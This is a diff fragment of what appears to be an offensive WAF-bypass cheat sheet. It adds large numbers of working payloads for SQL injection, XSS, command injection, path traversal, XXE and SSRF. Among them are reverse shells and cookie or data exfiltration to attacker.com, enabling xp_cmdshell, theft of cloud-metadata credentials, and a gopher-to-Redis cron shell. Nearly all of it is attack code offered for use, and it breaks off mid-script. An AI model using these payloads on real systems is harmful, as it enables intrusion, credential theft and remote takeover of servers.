+SELECT table_name FROM mysql.innodb_table_stats;
+SELECT table_name FROM mysql.innodb_index_stats;
+-- MySQL 8.0+
+SELECT * FROM performance_schema.tables;
+-- sys schema
+SELECT * FROM sys.schema_tables;
+```
+
+**Boolean Blind Without Spaces**
+```sql
+1'AND(SELECT(1)FROM(SELECT(SLEEP(0)))a)AND'1'='1
+1'AND(1)=(1)AND'1'='1
+1'AND(SELECT(0x41))>0AND'1'='1
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+'*/
+```
+
+**Inline Version Comment Bypass**
+```sql
+-- Only executes on MySQL >= 5.0.0
+/*!50000 SLEEP(5)*/
+/*!50000 UNION*//*!50000 SELECT*//*!50000 1,2,3*/
+-- Only executes on MySQL >= 4.0.0  
+/*!40000 UNION SELECT 1,2,3*/
+```
+
+**Second-Order Injection**
+```sql
+-- Register with username:  admin'--
+-- Query at login: SELECT * FROM users WHERE username='admin'--' AND password='x'
+-- Results in: SELECT * FROM users WHERE username='admin'
+```
+
+**Stacked Query Bypass**
+```sql
+-- When multi-statement is allowed
+1; INSERT INTO users VALUES('pwned','pwned')--
+1; UPDATE users SET password=0x70776e6564 WHERE username='admin'--
+1; DROP TABLE IF EXISTS temp_exfil; CREATE TABLE temp_exfil (data TEXT); INSERT INTO temp_exfil SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users--
+```
+
+**Full WAF Bypass Payload Chain (MySQL)**
+```
+id=1'/*!50000UNION*//*!50000SELECT*/1,2,GROUP_CONCAT(0x7e,username,0x3a,password,0x7e),4,5/*!50000FROM*//*!50000users*/--+-
+```
+
+### 3.2 MSSQL WAF Bypass Techniques
+
+**Comment and Whitespace**
+```sql
+1'/**/UNION/**/SELECT/**/1,2,3--
+1'%20UNION%20SELECT%201,2,3--
+1';EXEC(0x73656c65637420404076657273696f6e)--
+-- EXEC with hex-encoded string
+DECLARE @q NVARCHAR(100); SET @q=N'SE'+'LECT @@version'; EXEC(@q)
+```
+
+**String Concatenation Bypass**
+```sql
+-- Avoid UNION detection via string concat
+EXEC('SEL'+'ECT @@version')
+EXEC('SEL'+'ECT * FR'+'OM users')
+-- Using variables
+DECLARE @s NVARCHAR(200); SET @s = 'SELECT * FROM users'; EXEC(@s)
+```
+
+**xp_cmdshell Re-enable Chain**
+```sql
+-- Requires sysadmin
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+-- With WAF bypass:
+EXEC('sp_conf'+'igure ''show advanced options'',1')
+EXEC('RECONFIGURE')
+EXEC('sp_conf'+'igure ''xp_cmdshell'',1')
+EXEC('RECONFIGURE')
+EXEC('xp_cm'+'dshell ''whoami''')
+```
+
+**Time Delay Patterns**
+```sql
+-- Basic
+'; WAITFOR DELAY '0:0:5'--
+-- WAF bypass
+'; WAITFOR/**/DELAY/**/'0:0:5'--
+';%09WAITFOR%09DELAY%09'0:0:5'--
+-- Conditional
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
+```
+
+**sp_executesql Abuse**
+```sql
+DECLARE @q NVARCHAR(100)='SELECT * FROM users WHERE id=1';
+EXEC sp_executesql @q;
+-- Parameterized for bypass
+EXEC sp_executesql N'SELECT @p', N'@p NVARCHAR(MAX)', @p=N'test'
+```
+
+**Linked Server Pivoting**
+```sql
+SELECT * FROM OPENROWSET('SQLOLEDB','server=internal_server;uid=sa;pwd=;','SELECT * FROM master..sysdatabases')
+EXEC('SELECT * FROM [internal_server].master.dbo.sysdatabases')
+```
+
+### 3.3 PostgreSQL WAF Bypass Techniques
+
+**Dollar Quoting**
+```sql
+-- Instead of: SELECT 'string'
+-- Use: SELECT $$string$$
+-- Or: SELECT $tag$string$tag$
+1'; SELECT $$ SELECT version() $$::text--
+1'; DO $$DECLARE r RECORD; BEGIN RAISE NOTICE '%', (SELECT current_user); END$$--
+```
+
+**COPY TO/FROM Bypass for File Read/Write**
+```sql
+'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(whoami)'--
+'; COPY users TO '/tmp/users.txt'--
+'; CREATE TABLE t(c text); COPY t FROM '/etc/passwd'--
+```
+
+**pg_read_file / pg_ls_dir**
+```sql
+'; SELECT pg_read_file('/etc/passwd')--
+'; SELECT pg_ls_dir('/etc/')--
+'; SELECT pg_read_binary_file('/etc/shadow')--
+-- Large_objects for binary
+'; SELECT lo_from_bytea(0, pg_read_binary_file('/etc/shadow'))--
+```
+
+**Type Casting Bypass**
+```sql
+1 UNION SELECT NULL::text, version()::text, NULL::text
+1 UNION SELECT 1::varchar, $$test$$::varchar, 3::varchar
+-- Boolean without quotes
+1 AND 1::boolean
+1 OR 'a'='a'::text
+```
+
+**Array Abuse**
+```sql
+-- Avoid comma detection
+1 UNION SELECT ARRAY[1,2,3]::text
+1 UNION SELECT string_agg(username, ':') FROM users
+```
+
+### 3.4 Oracle WAF Bypass Techniques
+
+**CHR() Concatenation**
+```sql
+-- Instead of: SELECT 'union'
+-- Use: SELECT CHR(117)||CHR(110)||CHR(105)||CHR(111)||CHR(110)
+1'||CHR(32)||'UNION'||CHR(32)||'SELECT'||CHR(32)||'NULL,NULL,NULL'||CHR(32)||'FROM'||CHR(32)||'DUAL--
+-- Using CONCAT
+1' UNION SELECT CONCAT(CONCAT(CHR(58),username),CHR(58)) FROM all_users--
+```
+
+**UTL_HTTP Abuse (OOB Exfil)**
+```sql
+'; DECLARE req UTL_HTTP.REQ; res UTL_HTTP.RESP; BEGIN req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/'||(SELECT user FROM dual)); res := UTL_HTTP.GET_RESPONSE(req); END;--
+```
+
+**UTL_FILE**
+```sql
+'; DECLARE fh UTL_FILE.FILE_TYPE; BEGIN fh:=UTL_FILE.FOPEN('/tmp','out.txt','W'); UTL_FILE.PUT_LINE(fh,(SELECT user FROM dual)); UTL_FILE.FCLOSE(fh); END;--
+```
+
+**SYS.DUAL Tricks**
+```sql
+1 UNION SELECT NULL FROM DUAL
+1 UNION SELECT NULL,NULL,NULL FROM DUAL
+-- Version fingerprint
+1 UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1
+```
+
+---
+
+## 4. XSS WAF BYPASS (50+ Payloads)
+
+### 4.1 HTML Context Tag Mutation
+
+```html
+<!-- Case variation -->
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+
+<!-- Broken tags -->
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<s c r i p t>alert(1)</s c r i p t>
+
+<!-- Unusual tags -->
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe onload=alert(1) src=javascript:alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<object data="javascript:alert(1)">
+```
+
+### 4.2 JavaScript Context Bypass
+
+```javascript
+// Breaking out of string context
+'-alert(1)-'
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+
+// Template literal
+`${alert(1)}`
+tag`${alert(1)}`
+
+// eval() alternatives
+Function('alert(1)')()
+(new Function('alert(1)'))()
+setTimeout('alert(1)',0)
+setInterval('alert(1)',0)
+setImmediate('alert(1)')
+execScript('alert(1)')
+// Via location
+location='javascript:alert(1)'
+location.href='javascript:alert(1)'
+document.location='javascript:alert(1)'
+window.location='javascript:alert(1)'
+
+// Via write
+document.write('<img src=x onerror=alert(1)>')
+document.writeln('<img src=x onerror=alert(1)>')
+
+// Indirect eval
+[].constructor.constructor('alert(1)')()
+''.constructor.replace.call('test',/t/g,eval,'alert(1)')
+```
+
+### 4.3 Attribute Context Bypass
+
+```html
+<!-- Double-quoted attribute -->
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+" onmouseover=alert(1) x="
+
+<!-- Single-quoted attribute -->
+' onmouseover='alert(1)
+' onfocus='alert(1)' autofocus='
+
+<!-- Unquoted attribute -->
+value onmouseover=alert(1)
+1 onmouseover=alert(1)
+```
+
+### 4.4 SVG-Based XSS
+
+```html
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=onmouseover value=alert(1)>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<!-- SVG with foreignObject -->
+<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
+```
+
+### 4.5 MathML XSS
+
+```html
+<math><mtext><table><mglyph><style></table><img src=x onerror=alert(1)>
+<math><mtext><![CDATA[</mtext><script>alert(1)</script>]]></math>
+<math href="javascript:alert(1)">click</math>
+<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
+```
+
+### 4.6 AngularJS Sandbox Escapes
+
+```javascript
+// Angular 1.0.x
+{{constructor.constructor('alert(1)')()}}
+
+// Angular 1.1.x-1.2.x  
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+
+// Angular 1.3.x
+{{{}[{toString:[].join,valueOf:[]}.toString().split(',').join('constructor')][{toString:[].join,valueOf:[]}.toString().split(',').join('constructor')]('alert(1)')()}}
+
+// Angular 1.4.x
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+
+// Angular 1.5.x
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+
+// Angular 1.6.x (requires $eval or $parse)
+{{[].pop.constructor('alert(1)')()}}
+```
+
+### 4.7 Vue.js XSS
+
+```javascript
+// Vue.js template injection
+{{_c.constructor('alert(1)')()}}
+{{$el.ownerDocument.defaultView.alert(1)}}
+```
+
+### 4.8 CSP Bypass Payloads
+
+```html
+<!-- JSONP endpoints -->
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
+<script src="https://api.jquery.com/jsonp?callback=alert"></script>
+
+<!-- Angular script gadget (requires angular.js allowed in CSP) -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+
+<!-- base-uri injection (if base-uri not set in CSP) -->
+<base href="https://attacker.com/">
+
+<!-- Script gadgets in common libraries -->
+<!-- jQuery (unsafe-eval implied) -->
+$.get('https://attacker.com/?'+document.cookie)
+
+<!-- require.js gadget -->
+<script data-main="data:,alert(1)//" src="require.js"></script>
+```
+
+### 4.9 mXSS (Mutation XSS)
+
+```html
+<!-- These get mutated by innerHTML to become XSS -->
+<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<table><tbody><tr><td><img src='<img src=x onerror=alert(1) //'></td></tr></tbody></table>
+<!-- Comment injection mXSS -->
+<svg><!--</svg><img src=x onerror=alert(1)-->
+```
+
+### 4.10 Polyglot XSS Payloads
+
+```javascript
+// Works in HTML, JS string, JS variable, URL context
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+// Polyglot for HTML and JS attribute
+'"--><svg onload='/*</p></script></style></textarea><img src=x onerror=alert()>'>
+
+// Multi-context polyglot
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+```
+
+### 4.11 Encoding-Based Filter Bypass
+
+```html
+<!-- HTML entities -->
+&lt;script&gt;alert(1)&lt;/script&gt; → only in HTML context injection
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+<!-- Unicode fullwidth -->
+＜script＞alert(1)＜/script＞
+ａｌｅｒｔ（１）
+
+<!-- JS unicode escapes (inside JS strings) -->
+\u003cscript\u003ealert(1)\u003c/script\u003e
+eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')
+
+<!-- Hex encoding in JS -->
+eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
+```
+
+### 4.12 WAF-Specific XSS Bypasses
+
+**Cloudflare XSS Bypass (2024)**
+```html
+<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<details/open/ontoggle=alert`1`>
+<svg><animate onbegin=alert(1) attributeName=x>
+```
+
+**AWS WAF XSS Bypass**
+```html
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
+<SCRIPT/SRC="https://attacker.com/xss.js"></SCRIPT>
+```
+
+**ModSecurity XSS Bypass**
+```html
+<!-- Against CRS rule 941xxx -->
+<scr%00ipt>alert(1)</scr%00ipt>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<img src="jav&#x09;ascript:alert(1)">
+```
+
+### 4.13 Blind XSS Payloads
+
+```html
+<!-- XSShunter-style blind XSS -->
+"><script src="https://attacker.xss.ht"></script>
+'"><img src=x onerror=eval(atob("BASE64_OF_PAYLOAD"))>
+
+<!-- Self-contained blind XSS (no external dependency) -->
+"><svg onload="
+  var i=new Image();
+  i.src='https://attacker.com/?c='+encodeURIComponent(document.cookie)
+    +'&u='+encodeURIComponent(document.URL)
+    +'&h='+encodeURIComponent(document.referrer);
+">
+
+<!-- Via fetch -->
+"><svg onload="fetch('https://attacker.com/?'+btoa(document.cookie))">
+```
+
+---
+
+## 5. COMMAND INJECTION WAF BYPASS
+
+### 5.1 Space Substitution
 
 ```bash
-TARGET_URL="https://target.com"
+# IFS-based space bypass
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat${IFS}${IFS}/etc/passwd
 
-# Double URL encoding
-python3 << 'PYEOF'
+# Alternate whitespace
+cat%09/etc/passwd     # tab
+cat%0a/etc/passwd     # newline
+cat$'\x20'/etc/passwd # hex space
+cat$'\t'/etc/passwd   # tab via $'...'
+
+# No-space alternatives  
+{cat,/etc/passwd}
+{ls,-la,/}
+{wget,http://attacker.com}
+```
+
+### 5.2 Brace Expansion
+
+```bash
+{cat,/etc/passwd}
+{ls,-la,/}
+{nc,-e,/bin/sh,attacker.com,4444}
+{curl,-s,http://attacker.com/$(id)}
+{bash,-c,{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash}
+```
+
+### 5.3 Base64 Encoded Commands
+
+```bash
+# Encode payload
+echo -n 'id' | base64  # aWQ=
+echo -n 'cat /etc/passwd' | base64  # Y2F0IC9ldGMvcGFzc3dk
+
+# Execute via echo pipe
+echo${IFS}aWQ=|base64${IFS}-d|bash
+$(echo${IFS}aWQ=|base64${IFS}-d)
+
+# Without spaces
+{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash
+```
+
+### 5.4 Hex Encoded Commands
+
+```bash
+# Encode 'id' as hex
+printf '%s' 'id' | xxd -p  # 6964
+
+# Execute
+$(echo${IFS}6964|xxd${IFS}-r${IFS}-p)
+$(printf${IFS}"\x69\x64")
+`echo 6964|xxd -r -p`
+```
+
+### 5.5 Variable Substitution Tricks
+
+```bash
+# Split keywords using variables
+c=ca;t=t;$c$t /etc/passwd
+cmd=cat;$cmd /etc/passwd
+
+# Using parameter expansion
+a=c;b=at;$a$b /etc/passwd
+x=c${a}t;$x /etc/passwd
+
+# Indirect expansion
+_cat=cat;${_cat} /etc/passwd
+```
+
+### 5.6 Glob Pattern Command Bypass
+
+```bash
+# When 'cat' is filtered but path wildcards work
+/???/??t /etc/passwd       # /bin/cat or /usr/cat
+/usr/b??/curl http://...   # /usr/bin/curl
+/???/b?s? -c 'id'          # /bin/bash -c 'id'
+
+# Directory traversal for binary path
+/bin/./cat /etc/passwd
+/bin/../bin/cat /etc/passwd
+```
+
+### 5.7 Reverse Shell Without Spaces
+
+```bash
+# bash reverse shell without spaces
+{bash,-i,>&,/dev/tcp/attacker.com/4444,0>&1}
+
+# Python no-space
+python3${IFS}-c${IFS}'import${IFS}socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));[os.dup2(s.fileno(),x)for${IFS}x${IFS}in[0,1,2]];subprocess.call(["/bin/sh","-i"])'
+
+# nc alternative
+{nc,-e,/bin/sh,attacker.com,4444}
+{nc.traditional,-e,/bin/sh,attacker.com,4444}
+
+# Using base64 encoded reverse shell
+echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx|base64${IFS}-d|bash
+```
+
+### 5.8 DNS Exfil for Blind CMDi
+
+```bash
+# Exfiltrate via DNS lookup
+nslookup$(whoami).attacker.com
+host$(cat /etc/passwd|md5sum|cut -c1-8).attacker.com
+dig$(id|base64).attacker.com
+
+# With IFS bypass
+nslookup${IFS}$(whoami).attacker.com
+curl${IFS}http://$(whoami).attacker.com/
+
+# Burp Collaborator interaction
+curl${IFS}https://BURPCOLLAB.burpcollaborator.net/$(id|base64)
+```
+
+---
+
+## 6. PATH TRAVERSAL WAF BYPASS
+
+### 6.1 Encoding Variations
+
+```
+# Single encoding
+../../../etc/passwd → %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Double encoding
+../ → %252e%252e%252f
+../../../etc/passwd → %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Triple encoding  
+../ → %25252e%25252e%25252f
+```
+
+### 6.2 Unicode and Overlong UTF-8
+
+```
+# Unicode slash alternatives
+..%c0%af = ../ (overlong encoding of /)
+..%ef%bc%8f = ../  (fullwidth solidus)
+..%e0%80%af = ../  (overlong 3-byte encoding)
+
+# Dot alternatives
+%c0%2e = . (overlong)
+%e0%40%ae = . (overlong 3-byte)
+%c0%ae = . (overlong 2-byte)
+
+# Combined
+%c0%ae%c0%ae%c0%af = ../
+%c0%ae%c0%ae%ef%bc%8f = ../
+```
+
+### 6.3 Path Normalization Tricks
+
+```
+# Extra dots/slashes that normalize to ..
+....//
+....\/
+..../
+.../
+..%2f
+..\/ (Windows)
+
+# Mixed separators
+..\/../etc/passwd
+../\../etc/passwd
+..%5c..%5cetc%5cpasswd  (Windows with %5c = \)
+
+# Extra slashes
+..//../../etc/passwd
+.///.//..//..//etc/passwd
+```
+
+### 6.4 Null Byte Injection
+
+```
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+../../../etc/passwd%2500.jpg   # double-encoded null
+
+# In filename parameter
+filename=../../etc/passwd%00.pdf
+```
+
+### 6.5 Windows-Specific Bypass
+
+```
+# UNC path
+\\attacker.com\share\file
+
+# Drive letter
+c:/windows/system32/drivers/etc/hosts
+C:\Windows\System32\drivers\etc\hosts
+%WINDIR%\system32\drivers\etc\hosts
+
+# Alternate data streams
+../../Windows/system32/cmd.exe::$DATA
+
+# 8.3 filename format
+../../WINDOWS/SYSTEM32/DRIVER~1/ETC/PASSWD
+```
+
+### 6.6 Java Path Bypass
+
+```
+/./WEB-INF/../WEB-INF/web.xml
+/WEB-INF/./web.xml
+/%57EB-INF/web.xml   (%57 = W)
+/WEB-INF%2fweb.xml
+```
+
+### 6.7 PHP Include Bypass
+
+```php
+// php://filter to bypass include path restrictions
+php://filter/convert.base64-encode/resource=../../etc/passwd
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://input  (with POST body containing PHP code)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+```
+
+---
+
+## 7. XXE WAF BYPASS
+
+### 7.1 UTF-16 Encoding
+
+```bash
+# Generate UTF-16LE encoded XXE payload
+python3 -c "
+payload = '''<?xml version='1.0' encoding='UTF-16'?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+<foo>&xxe;</foo>'''
+print(payload.encode('utf-16').hex())
+" | xxd -r -p > xxe_utf16le.xml
+
+# UTF-16 with BOM
+python3 -c "
+import codecs
+payload = '<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'
+with open('xxe_utf16.xml', 'wb') as f:
+    f.write(codecs.BOM_UTF16_LE + payload.encode('utf-16-le'))
+"
+
+curl -X POST "https://TARGET/parse" \
+  -H "Content-Type: application/xml; charset=UTF-16" \
+  --data-binary @xxe_utf16.xml
+```
+
+### 7.2 Parameter Entity XXE
+
+```xml
+<!-- Bypass entity restrictions using parameter entities -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
+  %remote;
+  %int;
+]>
+<foo>&exfil;</foo>
+
+<!-- evil.dtd at attacker.com -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+```
+
+### 7.3 Blind OOB XXE via DNS/HTTP
+
+```xml
+<!-- DNS-based OOB -->
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % sp SYSTEM "http://BURPCOLLAB.burpcollaborator.net/">
+  %sp;
+]>
+<data>test</data>
+
+<!-- HTTP exfil -->
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<data>&exfil;</data>
+```
+
+### 7.4 XInclude XXE
+
+```xml
+<!-- No DOCTYPE needed, works in fragment processing -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+<!-- In a data field -->
+<name><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/></name>
+```
+
+### 7.5 SVG XXE
+
+```xml
+<!-- Upload as .svg file -->
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+### 7.6 XLSX/DOCX XXE
+
+```bash
+# Create malicious XLSX
+mkdir -p malicious_xlsx/xl
+cp template.xlsx malicious_xlsx/
+
+# Edit xl/sharedStrings.xml or [Content_Types].xml
+cat > malicious_xlsx/xl/sharedStrings.xml << 'EOF'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <si><t>&xxe;</t></si>
+</sst>
+EOF
+
+cd malicious_xlsx && zip -r ../evil.xlsx . && cd ..
+```
+
+### 7.7 PHP Filter XXE
+
+```xml
+<!-- Read PHP source via filter -->
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<data>&file;</data>
+```
+
+---
+
+## 8. SSRF WAF BYPASS
+
+### 8.1 IP Representation Bypass
+
+```
+# Decimal
+http://2130706433/         # 127.0.0.1 in decimal
+http://3232235777/         # 192.168.1.1 in decimal
+
+# Hex
+http://0x7f000001/         # 127.0.0.1
+http://0xC0A80101/         # 192.168.1.1
+
+# Octal
+http://0177.0.0.1/         # 127.0.0.1
+http://0177.000.000.001/
+
+# IPv6 mapped
+http://[::1]/              # localhost
+http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[0000:0000:0000:0000:0000:ffff:7f00:0001]/
+
+# Shortened
+http://127.1/              # 127.0.0.1 on some systems
+http://127.0.1/
+http://0/                  # 0.0.0.0
+```
+
+### 8.2 Cloud Metadata Bypass
+
+```bash
+# AWS IMDSv1
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+# Bypass with IP variants
+http://169.254.169.254.xip.io/
+http://169.254.169.254.nip.io/
+
+# AWS IMDSv2 — steal token via SSRF then use
+# Step 1: Get token
+curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# Step 2: Use token  
+curl -H "X-aws-ec2-metadata-token: TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+# Must include header: Metadata-Flavor: Google
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2020-09-01
+# Must include: Metadata: true
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
+```
+
+### 8.3 Protocol Handler SSRF
+
+```bash
+# File read
+file:///etc/passwd
+file://localhost/etc/passwd
+file:///proc/self/environ
+
+# Gopher (Redis exploitation)
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+
+# Dict protocol
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:11211/stats   # Memcached
+
+# LDAP
+ldap://127.0.0.1:389/
+ldaps://127.0.0.1:636/
+
+# FTP
+ftp://user:pass@127.0.0.1/etc/passwd
+```
+
+### 8.4 URL Parser Confusion
+
+```
+# @ trick (credentials confuse parser)
+https://attacker.com@169.254.169.254/
+http://attacker.com@127.0.0.1/
+https://169.254.169.254.attacker.com@169.254.169.254/
+
+# # fragment confusion
+https://169.254.169.254#.attacker.com/
+http://attacker.com/redirect?url=http://169.254.169.254#
+
+# Backslash confusion (Windows-style)
+http:\\169.254.169.254\latest\meta-data
+
+# Mixed slashes
+http:/\169.254.169.254/latest/
+
+# Port in path
+http://169.254.169.254:80@attacker.com/
+```
+
+### 8.5 SSRF to RCE via Redis
+
+```bash
+# SSRF payload to write cron job via Redis
+# URL-encoded gopher payload
+TARGET_SSRF_PARAM="url"
+ATTACKER_IP="10.0.0.1"
+ATTACKER_PORT="4444"
+
+# Generate Redis command set
+python3 -c "
 import urllib.parse
 
-payloads = {
-    "SQLi": "1' OR '1'='1",
-    "XSS": "<script>alert(1)</script>",
-    "LFI": "../../../../etc/passwd",
-    "CMD": "; id",
-}
-
-for name, payload in payloads.items():
-    enc1 = urllib.parse.quote(payload)
-    enc2 = urllib.parse.quote(enc1)
-    enc3 = urllib.parse.quote(enc2)
-    # Overlong UTF-8
-    print(f"\n=== {name} ===")
-    print(f"Single:  {enc1}")
-    print(f"Double:  {enc2}")
-    print(f"Triple:  {enc3}")
-PYEOF
-
-# HTML entity encoding
-python3 << 'PYEOF'
-payload = "<script>alert(1)</script>"
-# Decimal entities
-dec = ''.join(f'&#{ord(c)};' for c in payload)
-# Hex entities
-hex_ent = ''.join(f'&#x{ord(c):x};' for c in payload)
-# Mixed
-mixed = payload.replace('<', '&#60;').replace('>', '&#62;').replace('/', '&#47;')
-print(f"Decimal: {dec}")
-print(f"Hex:     {hex_ent}")
-print(f"Mixed:   {mixed}")
-PYEOF
-
-# Unicode fullwidth characters (bypass keyword matching)
-python3 << 'PYEOF'
-# Fullwidth Latin: ! (FF01) to ~ (FF5E) = ASCII 0x21-0x7E + 0xFEE0
-def to_fullwidth(s):
-    result = []
-    for c in s:
-        code = ord(c)
-        if 0x21 <= code <= 0x7E:
-            result.append(chr(code + 0xFEE0))
-        elif c == ' ':
-            result.append('\u3000')  # ideographic space
-        else:
-            result.append(c)
-    return ''.join(result)
-
-keywords = ['SELECT', 'UNION', 'script', 'onerror', 'alert', 'OR', 'AND']
-for kw in keywords:
-    print(f"{kw} -> {to_fullwidth(kw)}")
-PYEOF
-
-# Null byte injection
-curl -s "${TARGET_URL}?id=1%00'+OR+'1'='1--" | tee null_byte_sqli.txt
-curl -s "${TARGET_URL}?file=../../etc/passwd%00.jpg" | tee null_byte_traversal.txt
-curl -s "${TARGET_URL}?q=%00<script>alert(1)</script>" | tee null_byte_xss.txt
-
-# Unicode normalization bypass
-# ℳail -> Mail (normalization), ＠ -> @, ﹒ -> .
-python3 -c "
-import unicodedata
-# Characters that normalize to dangerous chars
-subs = {'s': 'ꜱ', 'e': 'ᴇ', 'l': 'ʟ', 'c': 'ᴄ', 't': 'ᴛ'}
-word = 'select'
-encoded = ''.join(subs.get(c, c) for c in word)
-print(f'Unicode sub for select: {encoded}')
-print(f'Normalized back: {unicodedata.normalize(\"NFKC\", encoded)}')
+redis_cmds = [
